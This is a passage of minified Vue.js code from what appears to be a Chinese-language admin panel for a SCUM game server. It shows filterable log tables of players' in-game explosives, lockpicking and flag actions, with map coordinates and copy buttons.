pulled",label:"拉保险栓",color:"blue"},{value:"Detonated",label:"投出",color:"green"},{value:"Ignited",label:"触发",color:"yellow"}],selectedRowKeys:[]}},mounted:function(){this.getGameAreaList(),this.getActionsList()},methods:{onActionsListCleanFilter:function(){var e=this;this.actionsListPagination.pageNum=1,this.$nextTick((function(){e.getActionsList(!0)}))},onActionsListFilter:function(){var e=this;this.actionsListPagination.pageNum=1,this.$nextTick((function(){e.getActionsList()}))},onChangeActionsListPagination:function(e){var t=this;this.actionsListPagination.pageNum=e,this.$nextTick((function(){t.getActionsList()}))},onShowSizeChangeActionsListPagination:function(e,t){var i=this;this.actionsListPagination.pageNum=1,this.actionsListPagination.pageSize=t,this.$nextTick((function(){i.getActionsList()}))},getActionsList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.actionsListPagination,n=a.pageNum,r=a.pageSize,e?(t.actionsListFilter={steamId:void 0,scumId:void 0,createdArea:void 0,targetName:void 0,timestampStart:void 0,timestampEnd:void 0},o={pageNum:n,pageSize:r,type:"explosives"}):(void 0!==(l=Object(A.cloneDeep)(t.actionsListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r,type:"explosives"},l)),t.loadingActionsListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/actionsRecordAdminSys/list",params:o});case 6:c=i.sent,t.loadingActionsListTable=!1,200===c.status&&(t.actionsListPagination.total=c.data.count,t.actionsListData=c.data.list),t.selectedRowKeys=[],i.next=16;break;case 12:i.prev=12,i.t0=i.catch(3),console.error(i.t0),t.loadingActionsListTable=!1;case 16:case"end":return i.stop()}}),i,null,[[3,12]])})))()},doCopyCommands:function(e){var t=this;this.$copyText(e).then((function(e){t.$message.success("已复制到剪贴板")}),(function(e){t.$message.error("复制失败"),console.log("复制失败：",e)}))},doCopyCommandsMulti:function(){var e=this,t=this.actionsListData.filter((function(t){return e.selectedRowKeys.includes(t.id)})).map((function(e){return e.rawText})).filter((function(e){var t;return(null==e||null===(t=e.trim())||void 0===t?void 0:t.length)>0})).join("\n");this.$copyText(t).then((function(t){e.$message.success("已复制到剪贴板")}),(function(t){e.$message.error("复制失败"),console.log("复制失败：",t)}))},getGameAreaList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/serverConfigAdminSys/gameAreaList"});case 3:200===(i=t.sent).status&&(e.gameArealList=i.data),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()}}},ni=ai,ri=Object(S.a)(ni,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onActionsListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onActionsListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")]),e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommandsMulti()}}},[e._v("全部复制到剪贴板")]):e._e()],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("操作者Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.actionsListFilter.steamId,callback:function(t){e.$set(e.actionsListFilter,"steamId",t)},expression:"actionsListFilter.steamId"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("操作者游戏名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.actionsListFilter.scumId,callback:function(t){e.$set(e.actionsListFilter,"scumId",t)},expression:"actionsListFilter.scumId"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("操作者所在区域:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.actionsListFilter.createdArea,callback:function(t){e.$set(e.actionsListFilter,"createdArea",t)},expression:"actionsListFilter.createdArea"}},e._l(e.gameArealList,(function(t){return i("a-select-option",{key:t,attrs:{title:t}},[e._v(e._s(t))])})),1),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("记录时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.actionsListFilter.timestampStart,e.actionsListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.actionsListFilter,"timestampStart",t[0]),e.$set(e.actionsListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.actionsListColumns,"data-source":e.actionsListData,expandedRowKeys:e.expandedActionsIds,"row-key":"id",pagination:!1,loading:e.loadingActionsListTable,bordered:"",scroll:{x:"100%"},size:"small","row-selection":{selectedRowKeys:e.selectedRowKeys,onChange:function(t){e.selectedRowKeys=t}}},on:{expand:function(t,i){if(t)void 0===e.expandedActionsIds.find((function(e){return e===i.id}))&&e.expandedActionsIds.push(i.id);else{var a=Object.keys(e.expandedActionsIds).find((function(t){return e.expandedActionsIds[t]===i.id}));void 0!==a&&e.expandedActionsIds.splice(a,1)}}},scopedSlots:e._u([{key:"steamId",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"scumId",fn:function(t,a){return[i("span",[e._v(e._s(t))]),a.actionsRecordUser&&a.actionsRecordUser.userName?i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.actionsRecordUser.userName}})}}},[e._v("("+e._s(a.actionsRecordUser.userName)+")")]):e._e()]}},{key:"locationsArea",fn:function(t,a){return[i("span",[e._v(e._s(a.createdLocations)+"("+e._s(a.createdArea)+")")])]}},{key:"targetName",fn:function(t){return[i("span",[e._v(e._s(t||"无数据"))])]}},{key:"actionType",fn:function(t,a){return[i("a-tag",{attrs:{color:void 0!==a.otherConfig.actionType&&void 0!==e.actionTypeList.find((function(e){return e.value===a.otherConfig.actionType}))?e.actionTypeList.find((function(e){return e.value===a.otherConfig.actionType})).color:"grey"}},[e._v(" "+e._s(void 0!==a.otherConfig.actionType&&void 0!==e.actionTypeList.find((function(e){return e.value===a.otherConfig.actionType}))?e.actionTypeList.find((function(e){return e.value===a.otherConfig.actionType})).label:a.otherConfig.actionType||"无")+" ")])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.expandedActionsIds.find((function(e){return e===t.id}))?["string"==typeof t.rawText?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 135px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("日志原文")]),i("div",{staticStyle:{width:"125px",height:"24px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[i("a-button",{attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommands(t.rawText)}}},[e._v("复制到剪贴板")])],1)]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("pre",{staticStyle:{width:"100%",height:"auto","padding-left":"10px"},domProps:{innerHTML:e._s(t.rawText.replace(/\n/g,"\\n<br>").replace(/\r/g,"\\r<br>"))}})]:e._e(),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("坐标信息详情")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("触发坐标(区域):")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(t.createdLocations)),i("strong",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.createdArea)+")")])])]),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("地图标识")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{height:"150px",width:"180px","padding-left":"10px"}},[i("map-locations",{attrs:{width:180,height:150,locations:t.createdLocations}})],1)]:e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.actionsListPagination.pageSize,current:e.actionsListPagination.pageNum,total:e.actionsListPagination.total},on:{change:e.onChangeActionsListPagination,showSizeChange:e.onShowSizeChangeActionsListPagination}})],1)}),[],!1,null,"598b9e85",null),oi=ri.exports,si={name:"Defusal",components:{MapLocations:J},data:function(){return{moment:R.a,loadingActionsListTable:!1,actionsListFilter:{steamId:void 0,scumId:void 0,createdArea:void 0,targetName:void 0,timestampStart:void 0,timestampEnd:void 0},actionsListColumns:[{title:"开锁人Steam ID",key:"steamId",dataIndex:"steamId",width:150,align:"center",scopedSlots:{customRender:"steamId"}},{title:"开锁人游戏名称",key:"scumId",dataIndex:"scumId",width:180,align:"center",scopedSlots:{customRender:"scumId"}},{title:"开锁人坐标(区域)",key:"locationsArea",dataIndex:"locationsArea",width:180,align:"center",scopedSlots:{customRender:"locationsArea"}},{title:"对象物品名称",key:"targetName",dataIndex:"targetName",width:200,align:"center",scopedSlots:{customRender:"targetName"}},{title:"难度类型",key:"lockType",dataIndex:"lockType",width:80,align:"center",scopedSlots:{customRender:"lockType"}},{title:"是否成功",key:"success",dataIndex:"success",width:80,align:"center",scopedSlots:{customRender:"success"}},{title:"排爆时长",key:"elapsedTime",dataIndex:"elapsedTime",width:100,align:"center",scopedSlots:{customRender:"elapsedTime"}},{title:"失败尝试次数",key:"failedAttempts",dataIndex:"failedAttempts",width:120,align:"center",scopedSlots:{customRender:"failedAttempts"}},{title:"生成记录时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],actionsListData:[],actionsListPagination:{pageSize:20,pageNum:1,total:0},expandedActionsIds:[],gameArealList:[],lockTypeList:[{value:"basic",label:"基础",color:"green"},{value:"medium",label:"中等",color:"yellow"},{value:"advanced",label:"高级",color:"red"}],selectedRowKeys:[]}},mounted:function(){this.getGameAreaList(),this.getActionsList()},methods:{onActionsListCleanFilter:function(){var e=this;this.actionsListPagination.pageNum=1,this.$nextTick((function(){e.getActionsList(!0)}))},onActionsListFilter:function(){var e=this;this.actionsListPagination.pageNum=1,this.$nextTick((function(){e.getActionsList()}))},onChangeActionsListPagination:function(e){var t=this;this.actionsListPagination.pageNum=e,this.$nextTick((function(){t.getActionsList()}))},onShowSizeChangeActionsListPagination:function(e,t){var i=this;this.actionsListPagination.pageNum=1,this.actionsListPagination.pageSize=t,this.$nextTick((function(){i.getActionsList()}))},getActionsList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.actionsListPagination,n=a.pageNum,r=a.pageSize,e?(t.actionsListFilter={steamId:void 0,scumId:void 0,createdArea:void 0,targetName:void 0,timestampStart:void 0,timestampEnd:void 0},o={pageNum:n,pageSize:r,type:"defusal"}):(void 0!==(l=Object(A.cloneDeep)(t.actionsListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r,type:"defusal"},l)),t.loadingActionsListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/actionsRecordAdminSys/list",params:o});case 6:c=i.sent,t.loadingActionsListTable=!1,200===c.status&&(t.actionsListPagination.total=c.data.count,t.actionsListData=c.data.list),t.selectedRowKeys=[],i.next=16;break;case 12:i.prev=12,i.t0=i.catch(3),console.error(i.t0),t.loadingActionsListTable=!1;case 16:case"end":return i.stop()}}),i,null,[[3,12]])})))()},doCopyCommands:function(e){var t=this;this.$copyText(e).then((function(e){t.$message.success("已复制到剪贴板")}),(function(e){t.$message.error("复制失败"),console.log("复制失败：",e)}))},doCopyCommandsMulti:function(){var e=this,t=this.actionsListData.filter((function(t){return e.selectedRowKeys.includes(t.id)})).map((function(e){return e.rawText})).filter((function(e){var t;return(null==e||null===(t=e.trim())||void 0===t?void 0:t.length)>0})).join("\n");this.$copyText(t).then((function(t){e.$message.success("已复制到剪贴板")}),(function(t){e.$message.error("复制失败"),console.log("复制失败：",t)}))},getGameAreaList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/serverConfigAdminSys/gameAreaList"});case 3:200===(i=t.sent).status&&(e.gameArealList=i.data),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()}}},li=si,ci=Object(S.a)(li,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onActionsListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onActionsListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")]),e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommandsMulti()}}},[e._v("全部复制到剪贴板")]):e._e()],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("操作者Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.actionsListFilter.steamId,callback:function(t){e.$set(e.actionsListFilter,"steamId",t)},expression:"actionsListFilter.steamId"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("操作者游戏名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.actionsListFilter.scumId,callback:function(t){e.$set(e.actionsListFilter,"scumId",t)},expression:"actionsListFilter.scumId"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("操作者所在区域:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.actionsListFilter.createdArea,callback:function(t){e.$set(e.actionsListFilter,"createdArea",t)},expression:"actionsListFilter.createdArea"}},e._l(e.gameArealList,(function(t){return i("a-select-option",{key:t,attrs:{title:t}},[e._v(e._s(t))])})),1),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("记录时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.actionsListFilter.timestampStart,e.actionsListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.actionsListFilter,"timestampStart",t[0]),e.$set(e.actionsListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.actionsListColumns,"data-source":e.actionsListData,expandedRowKeys:e.expandedActionsIds,"row-key":"id",pagination:!1,loading:e.loadingActionsListTable,bordered:"",scroll:{x:"100%"},size:"small","row-selection":{selectedRowKeys:e.selectedRowKeys,onChange:function(t){e.selectedRowKeys=t}}},on:{expand:function(t,i){if(t)void 0===e.expandedActionsIds.find((function(e){return e===i.id}))&&e.expandedActionsIds.push(i.id);else{var a=Object.keys(e.expandedActionsIds).find((function(t){return e.expandedActionsIds[t]===i.id}));void 0!==a&&e.expandedActionsIds.splice(a,1)}}},scopedSlots:e._u([{key:"steamId",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"scumId",fn:function(t,a){return[i("span",[e._v(e._s(t))]),a.actionsRecordUser&&a.actionsRecordUser.userName?i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.actionsRecordUser.userName}})}}},[e._v("("+e._s(a.actionsRecordUser.userName)+")")]):e._e()]}},{key:"locationsArea",fn:function(t,a){return[i("span",[e._v(e._s(a.createdLocations)+"("+e._s(a.createdArea)+")")])]}},{key:"targetName",fn:function(t){return[i("span",[e._v(e._s(t||"无数据"))])]}},{key:"lockType",fn:function(t,a){return[i("a-tag",{attrs:{color:void 0!==a.otherConfig.lockType&&void 0!==e.lockTypeList.find((function(e){return e.value===a.otherConfig.lockType}))?e.lockTypeList.find((function(e){return e.value===a.otherConfig.lockType})).color:"grey"}},[e._v(" "+e._s(void 0!==a.otherConfig.lockType&&void 0!==e.lockTypeList.find((function(e){return e.value===a.otherConfig.lockType}))?e.lockTypeList.find((function(e){return e.value===a.otherConfig.lockType})).label:a.otherConfig.lockType||"无")+" ")])]}},{key:"success",fn:function(t,a){return[i("a-tag",{attrs:{color:a.otherConfig&&!0===a.otherConfig.success?"green":"red"}},[e._v(e._s(a.otherConfig&&!0===a.otherConfig.success?"成功":"失败"))])]}},{key:"elapsedTime",fn:function(t,a){return[i("span",[i("strong",{staticStyle:{color:"darkyellow"}},[e._v(e._s(a.otherConfig&&a.otherConfig.elapsedTime?a.otherConfig.elapsedTime:"--"))]),e._v("s")])]}},{key:"failedAttempts",fn:function(t,a){return[i("span",[i("strong",{staticStyle:{color:"red"}},[e._v(e._s(a.otherConfig&&a.otherConfig.failedAttempts?a.otherConfig.failedAttempts:"--"))]),e._v("次")])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.expandedActionsIds.find((function(e){return e===t.id}))?["string"==typeof t.rawText?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 135px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("日志原文")]),i("div",{staticStyle:{width:"125px",height:"24px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[i("a-button",{attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommands(t.rawText)}}},[e._v("复制到剪贴板")])],1)]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("pre",{staticStyle:{width:"100%",height:"auto","padding-left":"10px"},domProps:{innerHTML:e._s(t.rawText.replace(/\n/g,"\\n<br>").replace(/\r/g,"\\r<br>"))}})]:e._e(),t.otherConfig&&t.otherConfig.owner&&t.otherConfig.owner.scumId?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("物主信息")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("strong",{staticStyle:{color:"#1890ff"}},[e._v(e._s(t.otherConfig.owner.scumId))]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.otherConfig.owner.steamId||"无Steam ID")+")")])])]:e._e(),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("坐标信息详情")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("触发坐标(区域):")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(t.createdLocations)),i("strong",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.createdArea)+")")])])]),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("地图标识")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{height:"150px",width:"180px","padding-left":"10px"}},[i("map-locations",{attrs:{width:180,height:150,locations:t.createdLocations}})],1)]:e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.actionsListPagination.pageSize,current:e.actionsListPagination.pageNum,total:e.actionsListPagination.total},on:{change:e.onChangeActionsListPagination,showSizeChange:e.onShowSizeChangeActionsListPagination}})],1)}),[],!1,null,"34cbf446",null),di=ci.exports,ui={name:"Flag",components:{MapLocations:J},data:function(){return{moment:R.a,loadingActionsListTable:!1,actionsListFilter:{steamId:void 0,scumId:void 0,createdArea:void 0,targetName:void 0,timestampStart:void 0,timestampEnd:void 0},actionsListColumns:[{title:"动作类型",key:"action",dataIndex:"action",width:100,align:"center",scopedSlots:{customRender:"action"}},{title:"操作人Steam ID",key:"steamId",dataIndex:"steamId",width:150,align:"center",scopedSlots:{customRender:"steamId"}},{title:"操作人游戏名称",key:"scumId",dataIndex:"scumId",width:180,align:"center",scopedSlots:{customRender:"scumId"}},{title:"操作人坐标(区域)",key:"locationsArea",dataIndex:"locationsArea",width:180,align:"center",scopedSlots:{customRender:"locationsArea"}},{title:"生成记录时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],actionsListData:[],actionsListPagination:{pageSize:20,pageNum:1,total:0},expandedActionsIds:[],gameArealList:[],actionTypeList:[{value:"createdFlag",label:"造旗",color:"green"},{value:"destroyedFlag",label:"毁旗",color:"red"}],selectedRowKeys:[]}},mounted:function(){this.getGameAreaList(),this.getActionsList()},methods:{onActionsListCleanFilter:function(){var e=this;this.actionsListPagination.pageNum=1,this.$nextTick((function(){e.getActionsList(!0)}))},onActionsListFilter:function(){var e=this;this.actionsListPagination.pageNum=1,this.$nextTick((function(){e.getActionsList()}))},onChangeActionsListPagination:function(e){var t=this;this.actionsListPagination.pageNum=e,this.$nextTick((function(){t.getActionsList()}))},onShowSizeChangeActionsListPagination:function(e,t){var i=this;this.actionsListPagination.pageNum=1,this.actionsListPagination.pageSize=t,this.$nextTick((function(){i.getActionsList()}))},getActionsList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.actionsListPagination,n=a.pageNum,r=a.pageSize,e?(t.actionsListFilter={steamId:void 0,scumId:void 0,createdArea:void 0,targetName:void 0,timestampStart:void 0,timestampEnd:void 0},o={pageNum:n,pageSize:r,type:"flag"}):(void 0!==(l=Object(A.cloneDeep)(t.actionsListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r,type:"flag"},l)),t.loadingActionsListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/actionsRecordAdminSys/list",params:o});case 6:c=i.sent,t.loadingActionsListTable=!1,200===c.status&&(t.actionsListPagination.total=c.data.count,t.actionsListData=c.data.list),t.selectedRowKeys=[],i.next=16;break;case 12:i.prev=12,i.t0=i.catch(3),console.error(i.t0),t.loadingActionsListTable=!1;case 16:case"end":return i.stop()}}),i,null,[[3,12]])})))()},doCopyCommands:function(e){var t=this;this.$copyText(e).then((function(e){t.$message.success("已复制到剪贴板")}),(function(e){t.$message.error("复制失败"),console.log("复制失败：",e)}))},doCopyCommandsMulti:function(){var e=this,t=this.actionsListData.filter((function(t){return e.selectedRowKeys.includes(t.id)})).map((function(e){return e.rawText})).filter((function(e){var t;return(null==e||null===(t=e.trim())||void 0===t?void 0:t.length)>0})).join("\n");this.$copyText(t).then((function(t){e.$message.success("已复制到剪贴板")}),(function(t){e.$message.error("复制失败"),console.log("复制失败：",t)}))},getGameAreaList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/serverConfigAdminSys/gameAreaList"});case 3:200===(i=t.sent).status&&(e.gameArealList=i.data),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()}}},pi=ui,mi=Object(S.a)(pi,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onActionsListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onActionsListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")]),e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommandsMulti()}}},[e._v("全部复制到剪贴板")]):e._e()],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("操作者Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.actionsListFilter.steamId,callback:function(t){e.$set(e.actionsListFilter,"steamId",t)},expression:"actionsListFilter.steamId"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("操作者游戏名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.actionsListFilter.scumId,callback:function(t){e.$set(e.actionsListFilter,"scumId",t)},expression:"actionsListFilter.scumId"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("操作者所在区域:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.actionsListFilter.createdArea,callback:function(t){e.$set(